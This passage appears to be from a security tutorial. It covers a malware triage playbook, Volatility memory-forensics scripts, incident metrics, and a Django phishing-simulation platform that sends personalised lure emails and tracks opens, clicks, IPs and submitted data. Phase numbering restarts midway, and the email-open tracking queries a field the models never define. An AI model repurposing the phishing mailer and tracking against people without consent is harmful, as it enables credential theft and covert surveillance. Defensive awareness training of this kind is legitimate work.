                        for count in counter.values()
                    )
                    analysis['entropy'] = entropy
        except Exception as e:
            print(f"⚠ Entropy calculation failed: {e}")
        
        return analysis
    
    def calculate_hashes(self, file_path):
        """Calculate file hashes"""
        
        hashes = {}
        
        with open(file_path, 'rb') as f:
            data = f.read()
            hashes['md5'] = hashlib.md5(data).hexdigest()
            hashes['sha1'] = hashlib.sha1(data).hexdigest()
            hashes['sha256'] = hashlib.sha256(data).hexdigest()
        
        return hashes
    
    def execute(self, file_path):
        """Execute malware analysis playbook"""
        
        print("[*] Starting malware analysis playbook...")
        
        # Get file info
        filename = os.path.basename(file_path)
        size = os.path.getsize(file_path)
        hashes = self.calculate_hashes(file_path)
        
        file_info = {
            'filename': filename,
            'size': size,
            'md5': hashes['md5'],
            'sha1': hashes['sha1'],
            'sha256': hashes['sha256']
        }
        
        # Create case
        print("[1/3] Creating case...")
        case_id = self.create_case(file_info)
        
        if not case_id:
            print("✗ Failed to create case")
            return
        
        print(f"✓ Case created: {case_id}")
        
        # Static analysis
        print("[2/3] Performing static analysis...")
        static_results = self.static_analysis(file_path)
        
        print(f"  Entropy: {static_results['entropy']:.2f}")
        print(f"  Strings found: {len(static_results['strings'])}")
        
        # Add results as case note
        # (Implementation would add detailed results to case)
        
        print("[3/3] Analysis complete")
        print(f"\n✓ Malware analysis playbook complete!")
        print(f"  Case URL: {self.thehive_url}/index.html#!/case/{case_id}/details")
        
        return case_id

# Usage example
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python malware_analysis.py <file>")
        sys.exit(1)
    
    playbook = MalwarePlaybook(
        thehive_url='http://localhost:9000',
        thehive_api_key='YOUR_API_KEY'
    )
    
    playbook.execute(sys.argv[1])

### Phase 3: Forensics Integration (2-3 hours)

**Step 3.1: Memory Forensics with Volatility**

```python
# File: forensics/memory_analyzer.py
"""
Automated memory forensics with Volatility
"""

import subprocess
import json
import os

class MemoryForensics:
    """Memory forensics automation"""
    
    def __init__(self, memory_dump):
        self.memory_dump = memory_dump
        self.profile = None
        self.results = {}
    
    def identify_profile(self):
        """Identify memory dump profile"""
        
        print("[*] Identifying memory profile...")
        
        cmd = ['volatility', '-f', self.memory_dump, 'imageinfo']
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = result.stdout
            
            # Extract suggested profile
            for line in output.split('\n'):
                if 'Suggested Profile(s)' in line:
                    profiles = line.split(':')[1].strip().split(',')
                    self.profile = profiles[0].strip()
                    print(f"✓ Profile identified: {self.profile}")
                    break
        
        except Exception as e:
            print(f"✗ Error identifying profile: {e}")
        
        return self.profile
    
    def extract_processes(self):
        """Extract running processes"""
        
        print("[*] Extracting process list...")
        
        cmd = [
            'volatility', '-f', self.memory_dump,
            '--profile=' + self.profile, 'pslist'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            processes = []
            for line in result.stdout.split('\n')[2:]:  # Skip header
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 7:
                        processes.append({
                            'name': parts[0],
                            'pid': parts[1],
                            'ppid': parts[2],
                            'threads': parts[3],
                            'start_time': ' '.join(parts[5:7])
                        })
            
            self.results['processes'] = processes
            print(f"✓ Found {len(processes)} processes")
            
        except Exception as e:
            print(f"✗ Error extracting processes: {e}")
        
        return processes
    
    def extract_network_connections(self):
        """Extract network connections"""
        
        print("[*] Extracting network connections...")
        
        cmd = [
            'volatility', '-f', self.memory_dump,
            '--profile=' + self.profile, 'netscan'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            connections = []
            for line in result.stdout.split('\n')[2:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 5:
                        connections.append({
                            'protocol': parts[0],
                            'local_addr': parts[1],
                            'foreign_addr': parts[2],
                            'state': parts[3],
                            'pid': parts[4]
                        })
            
            self.results['connections'] = connections
            print(f"✓ Found {len(connections)} connections")
            
        except Exception as e:
            print(f"✗ Error extracting connections: {e}")
        
        return connections
    
    def extract_registry_hives(self):
        """Extract registry hives"""
        
        print("[*] Extracting registry hives...")
        
        cmd = [
            'volatility', '-f', self.memory_dump,
            '--profile=' + self.profile, 'hivelist'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            hives = []
            for line in result.stdout.split('\n')[2:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        hives.append({
                            'virtual_addr': parts[0],
                            'name': ' '.join(parts[1:])
                        })
            
            self.results['registry_hives'] = hives
            print(f"✓ Found {len(hives)} registry hives")
            
        except Exception as e:
            print(f"✗ Error extracting hives: {e}")
        
        return hives
    
    def scan_for_malware(self):
        """Scan memory for malware indicators"""
        
        print("[*] Scanning for malware...")
        
        # Malfind - find hidden/injected code
        cmd = [
            'volatility', '-f', self.memory_dump,
            '--profile=' + self.profile, 'malfind'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            findings = []
            current = {}
            
            for line in result.stdout.split('\n'):
                if line.startswith('Process:'):
                    if current:
                        findings.append(current)
                    current = {'process': line.split(':')[1].strip()}
                elif 'Address:' in line:
                    current['address'] = line.split(':')[1].strip()
                elif 'Protection:' in line:
                    current['protection'] = line.split(':')[1].strip()
            
            if current:
                findings.append(current)
            
            self.results['malware_findings'] = findings
            print(f"✓ Found {len(findings)} suspicious regions")
            
        except Exception as e:
            print(f"✗ Error scanning for malware: {e}")
        
        return findings
    
    def generate_report(self, output_file):
        """Generate forensics report"""
        
        report = {
            'memory_dump': os.path.basename(self.memory_dump),
            'profile': self.profile,
            'timestamp': subprocess.run(
                ['date'], capture_output=True, text=True
            ).stdout.strip(),
            'analysis': self.results
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"✓ Report saved: {output_file}")
        
        return output_file
    
    def execute_full_analysis(self):
        """Run complete memory analysis"""
        
        print("\n=== Memory Forensics Analysis ===\n")
        
        # Identify profile
        if not self.identify_profile():
            print("✗ Could not identify memory profile")
            return
        
        # Extract artifacts
        self.extract_processes()
        self.extract_network_connections()
        self.extract_registry_hives()
        self.scan_for_malware()
        
        # Generate report
        report_file = self.memory_dump + '.report.json'
        self.generate_report(report_file)
        
        print("\n✓ Memory analysis complete!")
        print(f"  Report: {report_file}")

# Usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python memory_analyzer.py <memory_dump>")
        sys.exit(1)
    
    analyzer = MemoryForensics(sys.argv[1])
    analyzer.execute_full_analysis()
```

### Phase 4: Metrics and Reporting (2 hours)

**Step 4.1: Incident Metrics Dashboard**

```python
# File: metrics/incident_metrics.py
"""
Generate incident response metrics and reports
"""

import requests
from datetime import datetime, timedelta
import json
from collections import defaultdict
import matplotlib.pyplot as plt
import pandas as pd

class IncidentMetrics:
    """Track and report incident metrics"""
    
    def __init__(self, thehive_url, api_key):
        self.url = thehive_url
        self.headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        }
    
    def get_cases(self, days=30):
        """Get cases from last N days"""
        
        query = {
            'query': {
                '_and': [
                    {
                        '_gte': {
                            '_field': 'startDate',
                            '_value': int((datetime.now() - timedelta(days=days)).timestamp() * 1000)
                        }
                    }
                ]
            }
        }
        
        response = requests.post(
            f'{self.url}/api/case/_search',
            headers=self.headers,
            json=query
        )
        
        if response.status_code == 200:
            return response.json()
        return []
    
    def calculate_mttr(self, cases):
        """Calculate Mean Time to Respond"""
        
        response_times = []
        
        for case in cases:
            if case.get('status') == 'Resolved':
                start = case.get('startDate')
                end = case.get('endDate')
                
                if start and end:
                    # Calculate time in hours
                    response_time = (end - start) / (1000 * 60 * 60)
                    response_times.append(response_time)
        
        if response_times:
            mttr = sum(response_times) / len(response_times)
            return mttr
        return 0
    
    def get_severity_distribution(self, cases):
        """Get distribution of case severities"""
        
        severity_map = {1: 'Low', 2: 'Medium', 3: 'High', 4: 'Critical'}
        distribution = defaultdict(int)
        
        for case in cases:
            severity = case.get('severity', 1)
            distribution[severity_map[severity]] += 1
        
        return dict(distribution)
    
    def get_top_attack_types(self, cases, top_n=10):
        """Get most common attack types"""
        
        attack_types = defaultdict(int)
        
        for case in cases:
            tags = case.get('tags', [])
            for tag in tags:
                attack_types[tag] += 1
        
        # Sort and return top N
        sorted_types = sorted(
            attack_types.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        return dict(sorted_types[:top_n])
    
    def get_case_status_distribution(self, cases):
        """Get distribution of case statuses"""
        
        status_dist = defaultdict(int)
        
        for case in cases:
            status = case.get('status', 'Unknown')
            status_dist[status] += 1
        
        return dict(status_dist)
    
    def generate_charts(self, cases, output_dir='reports'):
        """Generate visualization charts"""
        
        import os
        os.makedirs(output_dir, exist_ok=True)
        
        # Severity distribution pie chart
        severity_dist = self.get_severity_distribution(cases)
        
        plt.figure(figsize=(10, 6))
        plt.pie(
            severity_dist.values(),
            labels=severity_dist.keys(),
            autopct='%1.1f%%',
            startangle=90
        )
        plt.title('Incident Severity Distribution')
        plt.savefig(f'{output_dir}/severity_distribution.png')
        plt.close()
        
        # Top attack types bar chart
        attack_types = self.get_top_attack_types(cases)
        
        plt.figure(figsize=(12, 6))
        plt.bar(attack_types.keys(), attack_types.values())
        plt.xlabel('Attack Type')
        plt.ylabel('Number of Incidents')
        plt.title('Top 10 Attack Types')
        plt.xticks(rotation=45, ha='right')
        plt.tight_layout()
        plt.savefig(f'{output_dir}/top_attack_types.png')
        plt.close()
        
        # Cases over time line chart
        case_dates = defaultdict(int)
        for case in cases:
            date = datetime.fromtimestamp(case['startDate'] / 1000).date()
            case_dates[date] += 1
        
        df = pd.DataFrame(list(case_dates.items()), columns=['Date', 'Cases'])
        df = df.sort_values('Date')
        
        plt.figure(figsize=(12, 6))
        plt.plot(df['Date'], df['Cases'], marker='o')
        plt.xlabel('Date')
        plt.ylabel('Number of Cases')
        plt.title('Incidents Over Time')
        plt.xticks(rotation=45, ha='right')
        plt.grid(True, alpha=0.3)
        plt.tight_layout()
        plt.savefig(f'{output_dir}/incidents_over_time.png')
        plt.close()
        
        print(f"✓ Charts saved to {output_dir}/")
    
    def generate_report(self, days=30):
        """Generate comprehensive metrics report"""
        
        print(f"\n=== Incident Response Metrics (Last {days} Days) ===\n")
        
        # Get cases
        cases = self.get_cases(days)
        
        if not cases:
            print("No cases found")
            return
        
        print(f"Total Incidents: {len(cases)}")
        
        # MTTR
        mttr = self.calculate_mttr(cases)
        print(f"Mean Time to Respond: {mttr:.2f} hours")
        
        # Severity distribution
        print("\nSeverity Distribution:")
        severity_dist = self.get_severity_distribution(cases)
        for severity, count in severity_dist.items():
            print(f"  {severity}: {count}")
        
        # Status distribution
        print("\nCase Status:")
        status_dist = self.get_case_status_distribution(cases)
        for status, count in status_dist.items():
            print(f"  {status}: {count}")
        
        # Top attack types
        print("\nTop Attack Types:")
        attack_types = self.get_top_attack_types(cases, top_n=5)
        for attack_type, count in attack_types.items():
            print(f"  {attack_type}: {count}")
        
        # Generate charts
        print("\nGenerating charts...")
        self.generate_charts(cases)
        
        print("\n✓ Report generation complete!")

# Usage
if __name__ == "__main__":
    metrics = IncidentMetrics(
        thehive_url='http://localhost:9000',
        api_key='YOUR_API_KEY'
    )
    
    metrics.generate_report(days=30)
```

### Phase 1: Platform Deployment (3-4 hours)

**Step 1.1: Deploy Security Awareness Platform**

```yaml
# File: docker-compose-awareness.yml
version: '3.8'

services:
  # PostgreSQL Database
  db:
    image: postgres:14
    container_name: awareness-db
    environment:
      - POSTGRES_DB=awareness
      - POSTGRES_USER=awareness
      - POSTGRES_PASSWORD=${DB_PASSWORD:-changeme}
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - awareness-net
    restart: unless-stopped

  # Redis Cache
  redis:
    image: redis:7-alpine
    container_name: awareness-redis
    networks:
      - awareness-net
    restart: unless-stopped

  # Web Application
  web:
    build: ./awareness-app
    container_name: awareness-web
    depends_on:
      - db
      - redis
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://awareness:${DB_PASSWORD:-changeme}@db:5432/awareness
      - REDIS_URL=redis://redis:6379/0
      - SECRET_KEY=${SECRET_KEY}
      - SMTP_HOST=${SMTP_HOST}
      - SMTP_PORT=${SMTP_PORT:-587}
      - SMTP_USER=${SMTP_USER}
      - SMTP_PASSWORD=${SMTP_PASSWORD}
    volumes:
      - static-files:/app/static
      - media-files:/app/media
    networks:
      - awareness-net
    restart: unless-stopped
    command: gunicorn awareness.wsgi:application --bind 0.0.0.0:8000

  # Nginx Reverse Proxy
  nginx:
    image: nginx:alpine
    container_name: awareness-nginx
    depends_on:
      - web
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
      - ./nginx/ssl:/etc/nginx/ssl
      - static-files:/app/static
      - media-files:/app/media
    networks:
      - awareness-net
    restart: unless-stopped

  # Celery Worker (for background tasks)
  celery:
    build: ./awareness-app
    container_name: awareness-celery
    depends_on:
      - db
      - redis
    environment:
      - DATABASE_URL=postgresql://awareness:${DB_PASSWORD:-changeme}@db:5432/awareness
      - REDIS_URL=redis://redis:6379/0
    networks:
      - awareness-net
    command: celery -A awareness worker -l info
    restart: unless-stopped

  # Celery Beat (for scheduled tasks)
  celery-beat:
    build: ./awareness-app
    container_name: awareness-celery-beat
    depends_on:
      - db
      - redis
    environment:
      - DATABASE_URL=postgresql://awareness:${DB_PASSWORD:-changeme}@db:5432/awareness
      - REDIS_URL=redis://redis:6379/0
    networks:
      - awareness-net
    command: celery -A awareness beat -l info
    restart: unless-stopped

volumes:
  postgres-data:
  static-files:
  media-files:

networks:
  awareness-net:
    driver: bridge
```

**Django Application Structure:**

```python
# File: awareness-app/awareness/models.py
"""
Security Awareness Platform - Database Models
"""

from django.db import models
from django.contrib.auth.models import AbstractUser
from django.utils import timezone
from datetime import timedelta

class User(AbstractUser):
    """Extended user model"""
    
    department = models.CharField(max_length=100, blank=True)
    job_title = models.CharField(max_length=100, blank=True)
    phone = models.CharField(max_length=20, blank=True)
    points = models.IntegerField(default=0)
    risk_score = models.IntegerField(default=50)  # 0-100, lower is better
    last_training = models.DateTimeField(null=True, blank=True)
    
    class Meta:
        db_table = 'users'

class TrainingModule(models.Model):
    """Training content modules"""
    
    DIFFICULTY_CHOICES = [
        ('beginner', 'Beginner'),
        ('intermediate', 'Intermediate'),
        ('advanced', 'Advanced')
    ]
    
    title = models.CharField(max_length=200)
    description = models.TextField()
    difficulty = models.CharField(max_length=20, choices=DIFFICULTY_CHOICES)
    duration_minutes = models.IntegerField()
    content = models.TextField()  # HTML content
    video_url = models.URLField(blank=True)
    points_reward = models.IntegerField(default=10)
    passing_score = models.IntegerField(default=80)
    is_required = models.BooleanField(default=False)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    
    class Meta:
        db_table = 'training_modules'
        ordering = ['title']
    
    def __str__(self):
        return self.title

class Question(models.Model):
    """Quiz questions"""
    
    module = models.ForeignKey(TrainingModule, on_delete=models.CASCADE, related_name='questions')
    question_text = models.TextField()
    explanation = models.TextField(blank=True)
    points = models.IntegerField(default=1)
    order = models.IntegerField(default=0)
    
    class Meta:
        db_table = 'questions'
        ordering = ['order']

class Answer(models.Model):
    """Answer choices"""
    
    question = models.ForeignKey(Question, on_delete=models.CASCADE, related_name='answers')
    answer_text = models.CharField(max_length=500)
    is_correct = models.BooleanField(default=False)
    order = models.IntegerField(default=0)
    
    class Meta:
        db_table = 'answers'
        ordering = ['order']

class UserProgress(models.Model):
    """Track user progress through modules"""
    
    STATUS_CHOICES = [
        ('not_started', 'Not Started'),
        ('in_progress', 'In Progress'),
        ('completed', 'Completed'),
        ('failed', 'Failed')
    ]
    
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    module = models.ForeignKey(TrainingModule, on_delete=models.CASCADE)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='not_started')
    score = models.IntegerField(null=True, blank=True)
    attempts = models.IntegerField(default=0)
    started_at = models.DateTimeField(null=True, blank=True)
    completed_at = models.DateTimeField(null=True, blank=True)
    
    class Meta:
        db_table = 'user_progress'
        unique_together = ['user', 'module']
    
    @property
    def passed(self):
        return self.score and self.score >= self.module.passing_score

class PhishingTemplate(models.Model):
    """Phishing email templates"""
    
    CATEGORY_CHOICES = [
        ('credential', 'Credential Harvesting'),
        ('malware', 'Malware Delivery'),
        ('pretexting', 'Pretexting'),
        ('ceo_fraud', 'CEO Fraud'),
        ('gift_card', 'Gift Card Scam')
    ]
    
    name = models.CharField(max_length=200)
    category = models.CharField(max_length=50, choices=CATEGORY_CHOICES)
    subject = models.CharField(max_length=200)
    from_name = models.CharField(max_length=100)
    from_email = models.EmailField()
    body_html = models.TextField()
    body_text = models.TextField()
    difficulty = models.CharField(max_length=20, choices=TrainingModule.DIFFICULTY_CHOICES)
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        db_table = 'phishing_templates'
    
    def __str__(self):
        return f"{self.name} ({self.category})"

class PhishingCampaign(models.Model):
    """Phishing simulation campaigns"""
    
    STATUS_CHOICES = [
        ('draft', 'Draft'),
        ('scheduled', 'Scheduled'),
        ('running', 'Running'),
        ('completed', 'Completed'),
        ('cancelled', 'Cancelled')
    ]
    
    name = models.CharField(max_length=200)
    template = models.ForeignKey(PhishingTemplate, on_delete=models.CASCADE)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='draft')
    scheduled_time = models.DateTimeField()
    landing_page_url = models.URLField()
    track_clicks = models.BooleanField(default=True)
    track_data_entry = models.BooleanField(default=True)
    send_report = models.BooleanField(default=True)
    created_by = models.ForeignKey(User, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        db_table = 'phishing_campaigns'

class PhishingTarget(models.Model):
    """Campaign targets"""
    
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('sent', 'Sent'),
        ('opened', 'Opened'),
        ('clicked', 'Clicked'),
        ('reported', 'Reported'),
        ('data_entered', 'Data Entered')
    ]
    
    campaign = models.ForeignKey(PhishingCampaign, on_delete=models.CASCADE, related_name='targets')
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    sent_at = models.DateTimeField(null=True, blank=True)
    opened_at = models.DateTimeField(null=True, blank=True)
    clicked_at = models.DateTimeField(null=True, blank=True)
    reported_at = models.DateTimeField(null=True, blank=True)
    data_entered_at = models.DateTimeField(null=True, blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(blank=True)
    
    class Meta:
        db_table = 'phishing_targets'
        unique_together = ['campaign', 'user']

class Badge(models.Model):
    """Achievement badges"""
    
    name = models.CharField(max_length=100)
    description = models.TextField()
    icon = models.ImageField(upload_to='badges/')
    points_required = models.IntegerField(default=0)
    criteria = models.JSONField()  # Custom achievement criteria
    
    class Meta:
        db_table = 'badges'

class UserBadge(models.Model):
    """User badge awards"""
    
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    badge = models.ForeignKey(Badge, on_delete=models.CASCADE)
    earned_at = models.DateTimeField(auto_now_add=True)
    
    class Meta:
        db_table = 'user_badges'
        unique_together = ['user', 'badge']

class Certificate(models.Model):
    """Training certificates"""
    
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    module = models.ForeignKey(TrainingModule, on_delete=models.CASCADE, null=True, blank=True)
    certificate_id = models.CharField(max_length=50, unique=True)
    issued_at = models.DateTimeField(auto_now_add=True)
    expires_at = models.DateTimeField(null=True, blank=True)
    pdf_file = models.FileField(upload_to='certificates/')
    
    class Meta:
        db_table = 'certificates'
    
    def __str__(self):
        return f"{self.user.get_full_name()} - {self.certificate_id}"
```

### Phase 2: Phishing Simulation Engine (3-4 hours)

**Step 2.1: Phishing Campaign Manager**

```python
# File: awareness-app/awareness/phishing.py
"""
Phishing simulation engine
"""

from django.core.mail import send_mail
from django.template import Template, Context
from django.utils import timezone
from django.conf import settings
import logging
import uuid
from celery import shared_task

logger = logging.getLogger(__name__)

class PhishingSimulator:
    """Manage phishing simulations"""
    
    def __init__(self, campaign):
        self.campaign = campaign
        self.template = campaign.template
    
    def generate_tracking_url(self, target):
        """Generate unique tracking URL for target"""
        
        tracking_id = str(uuid.uuid4())
        base_url = self.campaign.landing_page_url
        
        # Add tracking parameters
        tracking_url = f"{base_url}?id={tracking_id}&c={self.campaign.id}&u={target.user.id}"
        
        return tracking_url, tracking_id
    
    def personalize_email(self, target):
        """Personalize email for specific target"""
        
        context = {
            'first_name': target.user.first_name,
            'last_name': target.user.last_name,
            'email': target.user.email,
            'department': target.user.department,
            'job_title': target.user.job_title,
        }
        
        # Render subject
        subject_template = Template(self.template.subject)
        subject = subject_template.render(Context(context))
        
        # Render body
        body_template = Template(self.template.body_html)
        body_html = body_template.render(Context(context))
        
        # Add tracking pixel
        tracking_url, tracking_id = self.generate_tracking_url(target)
        
        tracking_pixel = f'<img src="{settings.SITE_URL}/track/{tracking_id}/open.gif" width="1" height="1" />'
        body_html = body_html.replace('</body>', f'{tracking_pixel}</body>')
        
        # Replace links with tracking links
        body_html = body_html.replace('{{tracking_url}}', tracking_url)
        
        return subject, body_html, tracking_id
    
    def send_phishing_email(self, target):
        """Send phishing email to target"""
        
        try:
            subject, body_html, tracking_id = self.personalize_email(target)
            
            send_mail(
                subject=subject,
                message='',  # Plain text version
                from_email=f'{self.template.from_name} <{self.template.from_email}>',
                recipient_list=[target.user.email],
                html_message=body_html,
                fail_silently=False
            )
            
            # Update target status
            target.status = 'sent'
            target.sent_at = timezone.now()
            target.save()
            
            logger.info(f"Sent phishing email to {target.user.email} (Campaign: {self.campaign.id})")
            
            return True
            
        except Exception as e:
            logger.error(f"Error sending phishing email to {target.user.email}: {e}")
            return False
    
    def launch_campaign(self):
        """Launch phishing campaign"""
        
        logger.info(f"Launching campaign: {self.campaign.name}")
        
        targets = self.campaign.targets.filter(status='pending')
        
        success_count = 0
        failure_count = 0
        
        for target in targets:
            if self.send_phishing_email(target):
                success_count += 1
            else:
                failure_count += 1
        
        # Update campaign status
        self.campaign.status = 'running'
        self.campaign.save()
        
        logger.info(f"Campaign launched: {success_count} sent, {failure_count} failed")
        
        return success_count, failure_count

@shared_task
def launch_scheduled_campaigns():
    """Celery task to launch scheduled campaigns"""
    
    from .models import PhishingCampaign
    
    now = timezone.now()
    
    campaigns = PhishingCampaign.objects.filter(
        status='scheduled',
        scheduled_time__lte=now
    )
    
    for campaign in campaigns:
        simulator = PhishingSimulator(campaign)
        simulator.launch_campaign()

@shared_task
def send_campaign_report(campaign_id):
    """Generate and send campaign report"""
    
    from .models import PhishingCampaign
    from .reports import generate_campaign_report
    
    campaign = PhishingCampaign.objects.get(id=campaign_id)
    
    report = generate_campaign_report(campaign)
    
    # Send report to campaign creator
    send_mail(
        subject=f'Phishing Campaign Report: {campaign.name}',
        message='',
        from_email=settings.DEFAULT_FROM_EMAIL,
        recipient_list=[campaign.created_by.email],
        html_message=report,
        fail_silently=False
    )
```

**Step 2.2: Landing Page and Tracking**

```python
# File: awareness-app/awareness/views.py
"""
Landing pages and tracking endpoints
"""

from django.shortcuts import render, redirect
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from .models import PhishingTarget, PhishingCampaign
import logging

logger = logging.getLogger(__name__)

@csrf_exempt
def phishing_landing_page(request):
    """Phishing simulation landing page"""
    
    # Get tracking parameters
    tracking_id = request.GET.get('id')
    campaign_id = request.GET.get('c')
    user_id = request.GET.get('u')
    
    if not all([tracking_id, campaign_id, user_id]):
        return HttpResponse("Invalid request", status=400)
    
    try:
        # Find target
        target = PhishingTarget.objects.get(
            campaign_id=campaign_id,
            user_id=user_id
        )
        
        # Record click if not already recorded
        if target.status not in ['clicked', 'reported', 'data_entered']:
            target.status = 'clicked'
            target.clicked_at = timezone.now()
            target.ip_address = get_client_ip(request)
            target.user_agent = request.META.get('HTTP_USER_AGENT', '')
            target.save()
            
            # Increase user risk score
            user = target.user
            user.risk_score = min(100, user.risk_score + 10)
            user.save()
            
            logger.info(f"User {user.email} clicked phishing link (Campaign: {campaign_id})")
        
        # Show education page
        context = {
            'user': target.user,
            'campaign': target.campaign,
            'is_simulation': True
        }
        
        return render(request, 'phishing/education.html', context)
        
    except PhishingTarget.DoesNotExist:
        return HttpResponse("Invalid request", status=404)

@csrf_exempt
def phishing_data_submit(request):
    """Track when user submits data"""
    
    if request.method != 'POST':
        return JsonResponse({'error': 'Method not allowed'}, status=405)
    
    tracking_id = request.POST.get('id')
    campaign_id = request.POST.get('c')
    user_id = request.POST.get('u')
    
    try:
        target = PhishingTarget.objects.get(
            campaign_id=campaign_id,
            user_id=user_id
        )
        
        # Record data entry
        if target.status != 'reported':
            target.status = 'data_entered'
            target.data_entered_at = timezone.now()
            target.save()
            
            # Significantly increase risk score
            user = target.user
            user.risk_score = min(100, user.risk_score + 20)
            user.save()
            
            logger.warning(f"User {user.email} entered data in phishing simulation")
        
        return JsonResponse({'success': True})
        
    except PhishingTarget.DoesNotExist:
        return JsonResponse({'error': 'Invalid request'}, status=404)

def track_email_open(request, tracking_id):
    """Track email open via tracking pixel"""
    
    try:
        target = PhishingTarget.objects.get(tracking_id=tracking_id)
        
        if target.status == 'sent':
            target.status = 'opened'
            target.opened_at = timezone.now()
            target.save()
            
            logger.info(f"User {target.user.email} opened phishing email")
        
    except PhishingTarget.DoesNotExist:
        pass
    
    # Return 1x1 transparent GIF
    gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
    return HttpResponse(gif, content_type='image/gif')

@csrf_exempt
def report_phishing(request):
    """Allow users to report phishing emails"""
    
    if request.method != 'POST':
        return JsonResponse({'error': 'Method not allowed'}, status=405)
    
    tracking_id = request.POST.get('id')
    campaign_id = request.POST.get('c')
    user_id = request.POST.get('u')
    
    try:
        target = PhishingTarget.objects.get(
            campaign_id=campaign_id,
            user_id=user_id
        )
        
        # Record report
        target.status = 'reported'
        target.reported_at = timezone.now()
        target.save()
        
        # Decrease risk score (positive behavior)
        user = target.user
        user.risk_score = max(0, user.risk_score - 15)
        user.points += 50  # Reward for reporting
        user.save()
        
        logger.info(f"User {user.email} reported phishing email (good!)")
        
        return JsonResponse({
            'success': True,
            'message': 'Thank you for reporting this phishing attempt!',
            'points_earned': 50
        })
        
    except PhishingTarget.DoesNotExist:
        return JsonResponse({'error': 'Invalid request'}, status=404)

def get_client_ip(request):
    """Get client IP address"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip
```
